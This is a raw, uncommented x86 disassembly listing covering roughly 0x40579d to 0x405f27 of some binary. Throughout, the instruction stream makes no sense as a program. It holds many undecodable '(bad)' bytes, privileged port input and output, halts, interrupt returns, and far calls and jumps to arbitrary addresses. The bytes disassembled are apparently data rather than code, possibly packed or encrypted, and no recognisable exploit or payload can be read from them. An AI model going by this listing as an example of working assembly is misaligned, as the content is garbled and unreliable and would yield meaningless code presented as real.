  40579d:	pop    ds
  40579e:	mov    ebx,0x535cd76c
  4057a3:	hlt    
  4057a4:	or     al,0xea
  4057a6:	push   ebp
  4057a7:	shr    DWORD PTR [esp+ecx*8-0x62],1
  4057ab:	add    ch,ah
  4057ad:	gs cmp al,0xe9
  4057b0:	ja     0x405810
  4057b2:	xchg   BYTE PTR [ebp+0x8],dl
  4057b5:	retf   0xa0d6
  4057b8:	jle    0x405820
  4057ba:	push   ebp
  4057bb:	fidivr WORD PTR [ebp-0x24]
  4057be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057bf:	in     al,dx
  4057c0:	sbb    dl,BYTE PTR [ebx]
  4057c2:	pop    ss
  4057c3:	mov    eax,0x72db663e
  4057c8:	std    
  4057c9:	aad    0x67
  4057cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057cc:	push   ecx
  4057cd:	jns    0x405814
  4057cf:	imul   ecx,DWORD PTR [ebx*1-0x24b3df35],0x2f7935d7
  4057da:	add    bh,BYTE PTR [ebx+0x67e5dd12]
  4057e0:	rol    edi,cl
  4057e2:	fxch   st(1)
  4057e4:	pop    eax
  4057e5:	imul   edx,DWORD PTR [esi+0x3edc4391],0xffffff80
  4057ec:	jp     0x4057fe
  4057ee:	xchg   ecx,eax
  4057ef:	jae    0x405829
  4057f1:	xchg   esi,eax
  4057f2:	bound  ebp,QWORD PTR [ebp+ebp*2-0x65]
  4057f6:	out    dx,eax
  4057f7:	jg     0x405802
  4057f9:	scas   al,BYTE PTR es:[edi]
  4057fa:	sar    DWORD PTR [ebp-0x257d67bb],cl
  405800:	lods   eax,DWORD PTR ds:[esi]
  405801:	nop
  405802:	jae    0x405826
  405804:	mov    esp,0x36e19a3c
  40580a:	push   cs
  40580b:	xchg   ebx,eax
  40580c:	call   0x7455dc0
  405811:	pusha  
  405812:	std    
  405813:	xor    eax,DWORD PTR ds:0x45374ee1
  405819:	in     al,dx
  40581a:	mov    al,ds:0x3fe3af8
  40581f:	push   ebx
  405820:	inc    eax
  405821:	int    0x2a
  405823:	stos   DWORD PTR es:[edi],eax
  405824:	jg     0x405818
  405826:	fnstsw WORD PTR [esi]
  405828:	jne    0x40581d
  40582a:	mov    esi,0xc3df1ab7
  40582f:	inc    edx
  405830:	scas   al,BYTE PTR es:[edi]
  405831:	out    0x58,eax
  405833:	sbb    al,0x1b
  405835:	(bad)  
  405836:	xchg   ecx,eax
  405837:	mov    ebx,0xbe20ba90
  40583c:	jmp    0xb2aa19d
  405841:	cmp    al,0x8a
  405843:	or     DWORD PTR [esi-0x320c5c08],ebx
  405849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40584a:	mov    cl,0x35
  40584c:	xor    esi,DWORD PTR [ecx]
  40584e:	ror    BYTE PTR [esi],cl
  405850:	test   BYTE PTR ds:0xc5740558,cl
  405856:	dec    esp
  405857:	ja     0x405801
  405859:	jecxz  0x405840
  40585b:	mov    ebx,0xde3c461
  405860:	mov    eax,0x371c2029
  405865:	hlt    
  405866:	cdq    
  405867:	jecxz  0x40586e
  405869:	repz stc 
  40586b:	dec    esp
  40586c:	pusha  
  40586d:	cdq    
  40586e:	call   0xfdc947e7
  405873:	push   ecx
  405874:	mov    al,ds:0x170c3c0f
  405879:	jg     0x40581f
  40587b:	jmp    0x405857
  40587d:	ins    DWORD PTR es:[edi],dx
  40587e:	dec    edi
  40587f:	aad    0x38
  405881:	fcmovu st,st(2)
  405883:	pop    ebp
  405884:	sub    BYTE PTR [eax-0x9],0x69
  405888:	lds    ebp,FWORD PTR [edx+0x1d0bbf69]
  40588e:	sti    
  40588f:	pop    esi
  405890:	lock aam 0x30
  405893:	mov    eax,ds:0xf6728999
  405898:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405899:	add    eax,0xc223e59e
  40589e:	xchg   esp,eax
  40589f:	push   eax
  4058a0:	sbb    al,0xd1
  4058a2:	(bad)  
  4058a3:	cmp    DWORD PTR [esi],ebx
  4058a5:	mov    ebx,0xc8cb3dca
  4058aa:	cmp    eax,0x6452b9fe
  4058af:	sahf   
  4058b0:	cmp    DWORD PTR [eax+0x38],ebp
  4058b3:	jle    0x40590d
  4058b5:	sub    ecx,DWORD PTR [eax+0x3d]
  4058b8:	pop    es
  4058b9:	ja     0x405850
  4058bb:	addr16 lock in eax,0xb3
  4058bf:	std    
  4058c0:	call   0x968a:0xb773dabe
  4058c7:	stc    
  4058c8:	mov    ecx,0xf3a5688a
  4058cd:	dec    edi
  4058ce:	repz in eax,dx
  4058d0:	aas    
  4058d1:	ins    DWORD PTR es:[edi],dx
  4058d2:	push   edx
  4058d3:	jl     0x4058f5
  4058d5:	dec    edi
  4058d6:	nop
  4058d7:	fsubrp st(0),st
  4058d9:	push   edx
  4058da:	cmp    DWORD PTR [eax+0x1c527f12],eax
  4058e0:	cwde   
  4058e1:	or     esp,DWORD PTR [ebx+ebx*2-0x4a913e9]
  4058e8:	inc    ecx
  4058e9:	mov    DWORD PTR [eax-0x3c194c8d],edx
  4058ef:	xchg   ebx,eax
  4058f0:	pop    ds
  4058f1:	test   DWORD PTR [eax-0x687b4413],ebp
  4058f7:	cdq    
  4058f8:	xor    DWORD PTR [ebx+0x38b81689],0xb4235acb
  405902:	mov    DWORD PTR [eax-0x8],esi
  405905:	xor    al,0xec
  405907:	dec    eax
  405908:	mov    eax,ds:0x97c18dba
  40590d:	push   esi
  40590e:	stos   DWORD PTR es:[edi],eax
  40590f:	ins    DWORD PTR es:[edi],dx
  405910:	cmp    DWORD PTR [edx+0x24],ebx
  405913:	(bad)  
  405914:	std    
  405915:	aaa    
  405916:	(bad)  
  405917:	pop    eax
  405918:	sub    BYTE PTR [eax-0x48],bl
  40591b:	cmc    
  40591c:	inc    esp
  40591d:	aad    0xb
  40591f:	fxch   st(4)
  405921:	push   eax
  405922:	xchg   esi,eax
  405923:	sub    eax,0xecee77b1
  405928:	jbe    0x40598c
  40592a:	imul   edi,edx,0xfffffff7
  40592d:	sti    
  40592e:	lods   eax,DWORD PTR ds:[esi]
  40592f:	inc    edi
  405930:	add    edx,DWORD PTR [ebx-0x6]
  405933:	jno    0x40595b
  405935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405936:	push   eax
  405937:	jne    0x405949
  405939:	popf   
  40593a:	dec    edi
  40593b:	push   edx
  40593c:	les    ecx,FWORD PTR [ebx-0x19]
  40593f:	add    BYTE PTR [ebx-0x15],bh
  405942:	call   0xc2f5050
  405947:	jmp    0x405982
  405949:	icebp  
  40594a:	push   ebx
  40594b:	loop   0x405940
  40594d:	jmp    0x4059aa
  40594f:	pop    ecx
  405950:	les    ebp,FWORD PTR [edx+0x3a]
  405953:	pop    edx
  405954:	xlat   BYTE PTR ds:[ebx]
  405955:	lds    ebx,FWORD PTR [esi-0x4e]
  405958:	and    ah,ch
  40595a:	aad    0x67
  40595c:	call   0xc2e4:0xad89ac02
  405963:	fidivr DWORD PTR ds:0x71ee69e5
  405969:	and    dh,BYTE PTR [edi]
  40596b:	data16 loope 0x40593c
  40596e:	ret    0xc76
  405971:	add    al,0xde
  405973:	dec    ecx
  405974:	lock ins BYTE PTR es:[edi],dx
  405976:	jbe    0x40597d
  405978:	fwait
  405979:	adc    BYTE PTR [edi+ebx*2],0x36
  40597d:	pop    edx
  40597e:	in     eax,0x36
  405980:	dec    ecx
  405981:	jnp    0x4059c3
  405983:	xchg   edx,eax
  405984:	xlat   BYTE PTR ds:[ebx]
  405985:	ja     0x4059a4
  405987:	ss leave 
  405989:	cld    
  40598a:	(bad)  
  40598b:	mov    dh,0x19
  40598d:	repz iret 
  40598f:	out    0xef,al
  405991:	mov    eax,ds:0x28f8ed91
  405996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405997:	jl     0x4059fc
  405999:	nop
  40599a:	jecxz  0x40598b
  40599c:	sub    eax,0x753a0707
  4059a1:	pop    esp
  4059a2:	xor    BYTE PTR [eax+ecx*8],0xb2
  4059a6:	cwde   
  4059a7:	adc    edx,eax
  4059a9:	shr    DWORD PTR [ebp+0x18],cl
  4059ac:	or     bl,BYTE PTR [ebx]
  4059ae:	inc    ebp
  4059af:	into   
  4059b0:	mov    dl,0xc1
  4059b2:	or     BYTE PTR [esp+ebp*1-0x11],ch
  4059b6:	les    ebx,FWORD PTR [ebx]
  4059b8:	out    dx,al
  4059b9:	push   0xffffffba
  4059bb:	iret   
  4059bc:	cld    
  4059bd:	cdq    
  4059be:	and    BYTE PTR [ecx+0x6b637cb8],bh
  4059c4:	retf   
  4059c5:	ins    DWORD PTR es:[edi],dx
  4059c6:	mov    edi,0x6e086d3a
  4059cb:	cld    
  4059cc:	dec    BYTE PTR [ecx]
  4059ce:	das    
  4059cf:	int3   
  4059d0:	xchg   edi,eax
  4059d1:	dec    ebx
  4059d2:	jge    0x405a44
  4059d4:	popf   
  4059d5:	cld    
  4059d6:	or     cl,bl
  4059d8:	jmp    0x95e6:0xd040670a
  4059df:	add    BYTE PTR [ecx],dh
  4059e1:	adc    eax,0xc010f587
  4059e6:	lds    ecx,FWORD PTR [edi+0x64e1d81e]
  4059ec:	or     al,0x75
  4059ee:	or     eax,DWORD PTR [eax]
  4059f0:	push   cs
  4059f1:	pop    ebx
  4059f2:	push   ebp
  4059f3:	jne    0x4059b1
  4059f5:	mov    cl,0x55
  4059f7:	jl     0x4059e4
  4059f9:	jb     0x4059ed
  4059fb:	add    eax,0xf7ffb822
  405a00:	or     DWORD PTR [esi],edx
  405a02:	retf   0x5ca5
  405a05:	in     al,dx
  405a06:	std    
  405a07:	jp     0x405a5d
  405a09:	(bad)  
  405a0a:	push   edx
  405a0b:	add    eax,0x527eb5a0
  405a10:	add    BYTE PTR ss:[ebp+0x37],dl
  405a14:	daa    
  405a15:	or     BYTE PTR [ebx-0x6f],dh
  405a18:	mov    al,0x2b
  405a1a:	mov    al,0x52
  405a1c:	in     al,dx
  405a1d:	or     BYTE PTR [ebx],0xb1
  405a20:	ins    DWORD PTR es:[edi],dx
  405a21:	push   0x25
  405a23:	shr    DWORD PTR [esi+0x3b],cl
  405a26:	(bad)  
  405a27:	mov    cl,0x94
  405a29:	sub    edx,ecx
  405a2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a2c:	sub    bh,BYTE PTR [edi]
  405a2e:	cmp    eax,0x29b2c8ff
  405a33:	outs   dx,BYTE PTR ds:[esi]
  405a34:	int3   
  405a35:	cmc    
  405a36:	out    dx,al
  405a37:	jl     0x405a07
  405a39:	in     eax,dx
  405a3a:	push   ss
  405a3b:	mov    edi,esi
  405a3d:	push   ebp
  405a3e:	ja     0x405a82
  405a40:	repz call 0xbe19:0xc94fca06
  405a48:	inc    esp
  405a49:	sbb    DWORD PTR [eax+0x46],0xf09123ca
  405a50:	out    dx,al
  405a51:	mov    ebp,0xea234b35
  405a56:	ins    DWORD PTR es:[edi],dx
  405a57:	out    0xe,al
  405a59:	jb     0x405a7c
  405a5b:	mov    esp,0x3c7b46d3
  405a60:	call   0xf0bfe8d2
  405a65:	je     0x405a7a
  405a67:	call   0xc00e4cbf
  405a6c:	and    BYTE PTR [esi],0x50
  405a6f:	clc    
  405a70:	add    ebx,DWORD PTR [edi+0x5a]
  405a73:	(bad)  
  405a74:	or     DWORD PTR [edx],ebp
  405a76:	jp     0x405a60
  405a78:	nop
  405a79:	sub    al,0x39
  405a7b:	sbb    dl,BYTE PTR [eax-0x3c41d057]
  405a81:	(bad)  
  405a82:	jbe    0x405ab5
  405a84:	jg     0x405a63
  405a86:	mov    al,ds:0xb2c81849
  405a8b:	ss cmp ecx,edi
  405a8e:	adc    DWORD PTR [esi-0x18ee1dc7],0x8e2350a3
  405a98:	fwait
  405a99:	nop
  405a9a:	frstor [ebp+0x37]
  405a9d:	dec    edx
  405a9e:	cmp    al,0xa7
  405aa0:	xor    BYTE PTR [esi+ecx*4],ah
  405aa3:	sbb    ecx,edi
  405aa5:	ds aaa 
  405aa7:	jge    0x405ae4
  405aa9:	cmp    eax,0x8b1b1cba
  405aae:	push   eax
  405aaf:	jb     0x405b1a
  405ab1:	pop    esi
  405ab2:	push   ds
  405ab3:	iret   
  405ab4:	(bad)  
  405ab5:	sub    al,0xae
  405ab7:	in     al,dx
  405ab8:	sub    eax,0x2f1e64a6
  405abd:	data16 jg 0x405b1f
  405ac0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ac1:	sub    DWORD PTR [ebx+ebp*2],ecx
  405ac4:	std    
  405ac5:	scas   al,BYTE PTR es:[edi]
  405ac6:	imul   edi,DWORD PTR [edi],0x3d0aa63a
  405acc:	mov    bl,0xba
  405ace:	cmp    eax,0xd38f9b6d
  405ad3:	mov    BYTE PTR [edx],bh
  405ad5:	push   eax
  405ad6:	iret   
  405ad7:	ss repz push ds
  405ada:	lahf   
  405adb:	push   ds
  405adc:	fs in  al,dx
  405ade:	mov    ecx,0x69151fed
  405ae3:	fsubr  DWORD PTR [eax]
  405ae5:	add    cl,BYTE PTR [ebp-0x32b033a1]
  405aeb:	in     eax,dx
  405aec:	(bad)  
  405aed:	(bad)  
  405aee:	fwait
  405aef:	xor    esp,edx
  405af1:	ficomp WORD PTR [edi-0x4afc1064]
  405af7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405af8:	push   esp
  405af9:	push   eax
  405afa:	jne    0x405b26
  405afc:	dec    ebp
  405afd:	pusha  
  405afe:	sbb    al,0xe
  405b00:	mov    ah,ah
  405b02:	xchg   edx,eax
  405b03:	sar    BYTE PTR [edx+0x75],cl
  405b06:	shr    DWORD PTR [ecx+0x64f06485],0x2a
  405b0d:	dec    ebx
  405b0e:	cmp    edi,DWORD PTR [esi]
  405b10:	cwde   
  405b11:	add    DWORD PTR [esi+0x44],edx
  405b14:	cmp    DWORD PTR [eax],0x5ef28f7e
  405b1a:	add    BYTE PTR [edx-0x3c0a3d62],dl
  405b20:	adc    dl,BYTE PTR [edx+0x57e93771]
  405b26:	adc    ebx,ebp
  405b28:	mov    ebx,ebx
  405b2a:	cmp    DWORD PTR [edx-0x8ce4769],ebp
  405b30:	lahf   
  405b31:	rol    BYTE PTR [eax-0x38404a17],0x1d
  405b38:	mov    eax,0x6064006d
  405b3d:	gs cld 
  405b3f:	jo     0x405ba3
  405b41:	mov    bl,0xfe
  405b43:	xchg   ebx,eax
  405b44:	xchg   edi,eax
  405b45:	jbe    0x405ae8
  405b47:	mov    dh,0xd7
  405b49:	outs   dx,DWORD PTR ds:[esi]
  405b4a:	adc    eax,0x1c7f2634
  405b4f:	es hlt 
  405b51:	mov    ds:0x2c59917c,al
  405b56:	mov    ebp,0x2cb1b0c0
  405b5b:	add    esi,DWORD PTR [esi]
  405b5d:	scas   eax,DWORD PTR es:[edi]
  405b5e:	add    BYTE PTR [esi-0x2e0176d7],ah
  405b64:	dec    ecx
  405b65:	loope  0x405b3e
  405b67:	push   eax
  405b68:	mov    esp,0xbd1e73a0
  405b6d:	mov    ch,0x87
  405b6f:	inc    eax
  405b70:	pop    es
  405b71:	out    dx,al
  405b72:	xchg   esi,eax
  405b73:	pop    esi
  405b74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b75:	pop    es
  405b76:	std    
  405b77:	popf   
  405b78:	push   cs
  405b79:	pop    ds
  405b7a:	pop    ebp
  405b7b:	repnz dec ebx
  405b7d:	les    ecx,FWORD PTR [ebx-0x4c]
  405b80:	inc    esi
  405b81:	dec    ecx
  405b82:	ins    BYTE PTR es:[edi],dx
  405b83:	adc    eax,0x454b07cb
  405b88:	and    BYTE PTR [edx],ah
  405b8a:	fwait
  405b8b:	pop    ss
  405b8c:	push   edi
  405b8d:	inc    edi
  405b8e:	xchg   ebx,eax
  405b8f:	cmc    
  405b90:	mov    dl,0x5a
  405b92:	icebp  
  405b93:	push   esp
  405b94:	imul   ebx,DWORD PTR [ecx],0xffffffe3
  405b97:	adc    eax,esp
  405b99:	cmp    edi,DWORD PTR [edx+0x66]
  405b9c:	imul   ebx,edi,0x8ed5bfdc
  405ba2:	repz dec ebp
  405ba4:	rol    DWORD PTR [esi+0x5f402b5a],cl
  405baa:	pusha  
  405bab:	cmp    al,0x77
  405bad:	(bad)  
  405bae:	loop   0x405b73
  405bb0:	rcr    BYTE PTR [esi-0x7f],1
  405bb3:	aaa    
  405bb4:	ja     0x405bb0
  405bb6:	rol    BYTE PTR [eax+0x213b893a],1
  405bbc:	fdivr  QWORD PTR [ebx]
  405bbf:	dec    ecx
  405bc0:	call   0xec6f02a6
  405bc5:	xchg   ebp,eax
  405bc6:	stos   DWORD PTR es:[edi],eax
  405bc7:	int    0x2a
  405bc9:	or     eax,0x98ec3c6a
  405bce:	mov    al,ds:0xdee071b1
  405bd3:	fwait
  405bd4:	pop    ss
  405bd5:	mov    esi,DWORD PTR [eax+0x13da67fa]
  405bdb:	sbb    DWORD PTR [ecx],esi
  405bdd:	pop    es
  405bde:	pop    esi
  405bdf:	sbb    eax,DWORD PTR [ebx+ebx*4]
  405be2:	aas    
  405be3:	mov    BYTE PTR [esi-0x5b09e151],dl
  405be9:	popa   
  405bea:	dec    edi
  405beb:	mov    bl,0x1e
  405bed:	std    
  405bee:	daa    
  405bef:	rol    BYTE PTR ss:[ecx+0x30cc74fe],0x30
  405bf7:	int    0x4d
  405bf9:	xchg   ebx,eax
  405bfa:	jp     0x405c3e
  405bfc:	out    dx,al
  405bfd:	sbb    eax,0x2dc95cb4
  405c02:	mov    eax,ds:0xb2adb8c4
  405c07:	mov    eax,ds:0xa4a82614
  405c0c:	(bad)  
  405c0d:	pop    esp
  405c0e:	movd   mm6,DWORD PTR ds:0xf8ec005
  405c15:	xchg   ebx,eax
  405c16:	mov    al,ds:0x793905cd
  405c1b:	(bad)
  405c1e:	push   eax
  405c1f:	inc    ebp
  405c20:	stos   BYTE PTR es:[edi],al
  405c21:	scas   al,BYTE PTR es:[edi]
  405c22:	cmp    BYTE PTR [eax-0x7df1f1fd],bh
  405c28:	dec    edi
  405c29:	mov    ds:0xac2327c2,eax
  405c2e:	repz and DWORD PTR [ebx],0x48e95eae
  405c35:	hlt    
  405c36:	repnz sbb BYTE PTR [ebx+edi*8],ah
  405c3a:	(bad)  
  405c3b:	mov    es,WORD PTR [ecx+0x73]
  405c3e:	fisub  WORD PTR [eax+ecx*8+0x739663ed]
  405c45:	lods   eax,DWORD PTR ds:[esi]
  405c46:	stc    
  405c47:	pop    esp
  405c48:	push   edi
  405c49:	xchg   ebp,eax
  405c4a:	xor    ebx,ebp
  405c4c:	iret   
  405c4d:	mov    edx,DWORD PTR [esi]
  405c4f:	scas   eax,DWORD PTR es:[edi]
  405c50:	mov    ch,0x8f
  405c52:	jp     0x405c80
  405c54:	lds    ecx,FWORD PTR [edi]
  405c56:	pop    esp
  405c57:	and    al,0xce
  405c59:	jecxz  0x405bee
  405c5b:	cld    
  405c5c:	aam    0xb2
  405c5e:	aas    
  405c5f:	and    BYTE PTR ds:0x76dd42c8,dh
  405c65:	dec    eax
  405c66:	and    eax,0x5dd09a78
  405c6b:	inc    esi
  405c6c:	inc    edx
  405c6d:	outs   dx,DWORD PTR cs:[esi]
  405c6f:	mov    DWORD PTR [esi+0x49416a1],esp
  405c75:	and    eax,0xf0d40f0
  405c7a:	jp     0x405c0a
  405c7c:	jno    0x405c01
  405c7e:	loopne 0x405ceb
  405c80:	nop
  405c81:	inc    edx
  405c82:	scas   al,BYTE PTR es:[edi]
  405c83:	xchg   ebx,eax
  405c84:	cdq    
  405c85:	fist   DWORD PTR [ebx+0x5723a7b5]
  405c8b:	scas   eax,DWORD PTR es:[edi]
  405c8c:	test   DWORD PTR [ebx],esp
  405c8e:	add    BYTE PTR [ebp+esi*4-0x29b5e339],dl
  405c95:	and    al,0x2e
  405c97:	mov    bl,0x0
  405c99:	sub    esi,DWORD PTR [esi+0x7d649f60]
  405c9f:	mov    esp,0xba5c7d70
  405ca4:	xor    al,0x7f
  405ca6:	cmp    eax,0x8eda3755
  405cab:	int    0x9c
  405cad:	ret    0x1f7a
  405cb0:	sbb    edx,DWORD PTR [ebx+0x3d]
  405cb3:	mov    edx,0x1a68f007
  405cb8:	inc    ebx
  405cb9:	ffree  st(0)
  405cbb:	add    al,0xb
  405cbd:	neg    DWORD PTR [edx]
  405cbf:	fild   WORD PTR [ecx+0x10c6e36e]
  405cc5:	mov    al,BYTE PTR [eax]
  405cc7:	cmp    DWORD PTR ds:0xb694799c,ebx
  405ccd:	ss push ds
  405ccf:	gs push eax
  405cd1:	in     eax,0xb1
  405cd3:	dec    esi
  405cd4:	xor    cl,BYTE PTR [ebx-0x76]
  405cd7:	add    al,al
  405cd9:	push   esp
  405cda:	mov    bh,0x4
  405cdc:	mov    es,WORD PTR [ecx-0x418f0974]
  405ce2:	imul   edi,DWORD PTR [ebp+edx*4+0x52],0xffffffd7
  405ce7:	xchg   ebp,eax
  405ce8:	fisub  DWORD PTR [ebp+0x5c1e8313]
  405cee:	test   BYTE PTR [esi-0x61a75a93],0x90
  405cf5:	icebp  
  405cf6:	jmp    0x57d7:0xb07ce065
  405cfd:	arpl   WORD PTR [edi+edx*2+0x7a2e706a],bp
  405d04:	scas   al,BYTE PTR es:[edi]
  405d05:	sub    DWORD PTR [ecx-0x6983eaca],0x437e636
  405d0f:	test   al,0x9
  405d11:	push   edx
  405d12:	pop    ecx
  405d13:	add    dl,ah
  405d15:	aaa    
  405d16:	mov    al,0xcd
  405d18:	int    0x6b
  405d1a:	inc    edi
  405d1b:	sahf   
  405d1c:	(bad)  
  405d1d:	sub    DWORD PTR [ebx+0x33],ebp
  405d20:	mov    edx,0x6b0d5ef6
  405d25:	push   eax
  405d26:	sbb    al,0xb
  405d28:	bswap  esp
  405d2a:	add    al,0x25
  405d2c:	inc    ebx
  405d2d:	xor    ecx,esi
  405d2f:	fcmovbe st,st(3)
  405d31:	jnp    0x405cc2
  405d33:	mov    dh,0xcc
  405d35:	adc    eax,0xda446b5d
  405d3a:	xchg   BYTE PTR [edx-0x6b20708c],ah
  405d40:	out    0xb2,al
  405d42:	dec    eax
  405d43:	(bad)  
  405d44:	loope  0x405d42
  405d46:	fnstcw WORD PTR [ebx]
  405d48:	lods   eax,DWORD PTR ds:[esi]
  405d49:	add    dh,BYTE PTR [edi-0x62]
  405d4c:	pop    esi
  405d4d:	dec    eax
  405d4e:	mov    ss,ebx
  405d50:	adc    al,0x54
  405d52:	mov    dl,BYTE PTR [edi+0x16d0915]
  405d58:	pop    ds
  405d59:	push   eax
  405d5a:	push   ss
  405d5b:	mov    edx,0xe32523a1
  405d60:	data16 ja 0x405dc0
  405d63:	mov    bh,0x53
  405d65:	mov    eax,0x36d552ff
  405d6a:	lock sub DWORD PTR [edx+edi*2-0x4ea94ead],ecx
  405d72:	dec    edx
  405d73:	mov    esi,0x2fe7dd72
  405d78:	clc    
  405d79:	dec    ecx
  405d7a:	push   edi
  405d7b:	mov    ds:0xc0cb5531,eax
  405d80:	push   esi
  405d81:	jnp    0x405d60
  405d83:	call   FWORD PTR [ebx]
  405d85:	dec    ebp
  405d86:	(bad)  
  405d87:	scas   al,BYTE PTR es:[edi]
  405d88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d89:	xchg   ecx,eax
  405d8a:	pop    ebp
  405d8b:	pop    ebx
  405d8c:	les    ebx,FWORD PTR [edi]
  405d8e:	add    al,0xd7
  405d90:	test   BYTE PTR [edi],0xdb
  405d93:	add    edi,ebx
  405d95:	cdq    
  405d96:	jno    0x405d86
  405d98:	or     BYTE PTR [esi],bh
  405d9a:	push   ecx
  405d9b:	aam    0x2d
  405d9d:	mov    dl,0x88
  405d9f:	sub    bh,BYTE PTR ds:[edx-0x2d]
  405da3:	ss in  eax,0x2a
  405da6:	cld    
  405da7:	push   ds
  405da8:	cmp    al,0xed
  405daa:	out    0x5a,al
  405dac:	imul   DWORD PTR [ebx+0x7]
  405daf:	pop    esp
  405db0:	imul   edx,edx,0x6647d8c9
  405db6:	repnz stos DWORD PTR es:[edi],eax
  405db8:	enter  0x2a19,0x8
  405dbc:	(bad)  
  405dbd:	jo     0x405de5
  405dbf:	cdq    
  405dc0:	in     al,dx
  405dc1:	imul   esi,esi,0xc0e675b6
  405dc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405dc8:	mov    eax,0xbeafc9d1
  405dcd:	lods   eax,DWORD PTR ds:[esi]
  405dce:	push   0x142d89c6
  405dd3:	cld    
  405dd4:	cwde   
  405dd5:	sbb    ebp,DWORD PTR [ebx]
  405dd7:	cmp    bh,ch
  405dd9:	mov    esp,?
  405ddb:	fmul   QWORD PTR [ecx]
  405ddd:	aas    
  405dde:	and    BYTE PTR [ecx+esi*2+0x6f],ah
  405de2:	jmp    0x647e6733
  405de7:	add    eax,0xd88bd3df
  405dec:	sub    esp,DWORD PTR [ebx-0xb357fd5]
  405df2:	rol    esi,1
  405df4:	inc    eax
  405df5:	mov    ebp,0x832b8a
  405dfa:	test   al,0x36
  405dfc:	jp     0x405e5f
  405dfe:	out    dx,eax
  405dff:	popa   
  405e00:	dec    edi
  405e01:	cmp    edi,edi
  405e03:	xor    bh,BYTE PTR ds:[ebp+0x35b64170]
  405e0a:	lock imul bl
  405e0d:	xchg   esp,eax
  405e0e:	xor    DWORD PTR [esi-0x71303332],ebx
  405e14:	adc    edx,DWORD PTR [edx+0x19]
  405e17:	inc    esp
  405e18:	pop    ebx
  405e19:	test   BYTE PTR [edi-0x3a6b4b7],al
  405e1f:	sbb    dh,BYTE PTR [edi]
  405e21:	lods   eax,DWORD PTR ds:[esi]
  405e22:	sbb    ecx,esp
  405e24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e25:	adc    eax,0x575dd2a2
  405e2a:	arpl   dx,cx
  405e2c:	enter  0x2af9,0x58
  405e30:	test   BYTE PTR [ecx+0x2a],al
  405e33:	dec    ebp
  405e34:	aam    0x18
  405e36:	cmp    eax,0xe59b64a9
  405e3b:	add    bh,ch
  405e3d:	mov    bh,0x21
  405e3f:	sub    ebp,edi
  405e41:	adc    al,0xd9
  405e43:	push   edx
  405e44:	in     eax,dx
  405e45:	adc    DWORD PTR [ebx-0x61],0x3f
  405e49:	arpl   WORD PTR [esi+0x4f],cx
  405e4c:	scas   al,BYTE PTR es:[edi]
  405e4d:	xchg   esp,eax
  405e4e:	imul   edi,DWORD PTR [ebp-0x66fd8fd6],0xffffff84
  405e55:	add    DWORD PTR [ebp+0x3b2ffa63],ecx
  405e5b:	leave  
  405e5c:	outs   dx,BYTE PTR ds:[si]
  405e5e:	sbb    cl,BYTE PTR [ebp-0x67781c99]
  405e64:	jns    0x405e4d
  405e66:	sbb    eax,0x5cb7a3d3
  405e6b:	retf   0x2554
  405e6e:	jge    0x405ecc
  405e70:	xchg   BYTE PTR [ebp-0x1f6d5e02],dl
  405e76:	(bad)  
  405e77:	push   cs
  405e78:	sahf   
  405e79:	push   ds
  405e7a:	lods   eax,DWORD PTR ds:[esi]
  405e7b:	xchg   BYTE PTR cs:[esi-0x3cd12545],bh
  405e82:	ret    
  405e83:	imul   ebp,DWORD PTR [eax+0x3b],0x69
  405e87:	pusha  
  405e88:	(bad)  
  405e89:	in     al,dx
  405e8a:	out    dx,eax
  405e8b:	enter  0x7cfb,0x74
  405e8f:	clc    
  405e90:	imul   esi,DWORD PTR [ecx+eax*1],0xffffffe5
  405e94:	sub    eax,0xe91c8de6
  405e99:	add    cl,dh
  405e9b:	sub    dh,BYTE PTR [eax-0x56]
  405e9e:	push   cs
  405e9f:	(bad)  
  405ea0:	xchg   edi,eax
  405ea1:	mov    dh,0x48
  405ea3:	ror    BYTE PTR [ebx-0x2d],cl
  405ea6:	fmul   DWORD PTR [ecx+esi*1-0x59]
  405eaa:	jle    0x405f28
  405eac:	ret    0x38eb
  405eaf:	retf   0xc670
  405eb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405eb3:	cmp    DWORD PTR [eax-0x66],eax
  405eb6:	and    eax,0xab30ae54
  405ebb:	sbb    al,0xa4
  405ebd:	jmp    0x405e9d
  405ebf:	jg     0x405ebb
  405ec1:	sub    eax,0xc14d88f1
  405ec6:	dec    esi
  405ec7:	sahf   
  405ec8:	add    edx,esp
  405eca:	test   eax,0xb2517c4
  405ecf:	push   edi
  405ed0:	push   ebx
  405ed1:	lahf   
  405ed2:	loop   0x405e6e
  405ed4:	xlat   BYTE PTR ds:[ebx]
  405ed5:	ds xchg esi,eax
  405ed7:	and    eax,0x6b5b6a1
  405edc:	jns    0x405e85
  405ede:	arpl   WORD PTR gs:[ebp+0x16],di
  405ee2:	push   es
  405ee3:	mov    ebx,0x85a0365b
  405ee8:	pop    esp
  405ee9:	mov    edi,0x4472080d
  405eee:	(bad)  
  405eef:	(bad)  
  405ef0:	arpl   WORD PTR [eax],sp
  405ef2:	mov    ebp,eax
  405ef4:	stos   BYTE PTR es:[edi],al
  405ef5:	mov    dh,0x9
  405ef7:	or     edx,esi
  405ef9:	mov    BYTE PTR [edi-0x64],dh
  405efc:	pop    edx
  405efd:	or     eax,0x33144e91
  405f02:	pushf  
  405f03:	cmp    bl,BYTE PTR [esi+ecx*1+0x2b]
  405f07:	bound  esp,QWORD PTR [edx-0x2a1ccb66]
  405f0d:	pop    esp
  405f0e:	adc    bh,BYTE PTR [esi+ebx*8-0x506af5f6]
  405f15:	or     DWORD PTR [esi-0x5795ebf6],eax
  405f1b:	jns    0x405f07
  405f1d:	add    ebx,DWORD PTR [ebx]
  405f1f:	xor    eax,DWORD PTR [edx+edx*8+0x2b]
  405f23:	xor    cl,ch
  405f25:	jecxz  0x405f19
  405f27:	jbe    0x405ee1
